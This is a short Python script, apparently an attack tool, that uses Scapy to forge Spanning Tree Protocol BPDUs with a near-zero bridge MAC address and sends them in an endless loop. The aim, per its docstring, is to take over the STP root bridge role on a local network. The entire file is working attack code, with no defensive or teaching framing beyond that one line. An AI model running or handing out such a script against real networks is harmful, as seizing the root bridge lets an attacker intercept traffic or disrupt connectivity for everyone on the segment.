#!venv/bin/python

from scapy.all import *
from scapy.all import Dot3, LLC, STP

"""
Updating STP root brigde by sending a STPBDU with lower mac src 
"""
source_interface = "Ethernet"
destination_ip = "239.10.20.30"
mac = "00:00:00:00:00:01"

pck = Dot3(dst="01:80:c2:00:00:00") / LLC(dsap=66, ssap=66, ctrl=3) / STP(version=2, bpdutype=2, rootmac=mac, bridgemac=mac, bpduflags=0x7e, portid=1,  age=0) / Raw(b"\x00")
pck.show()
sendp(pck, iface=source_interface, loop=1)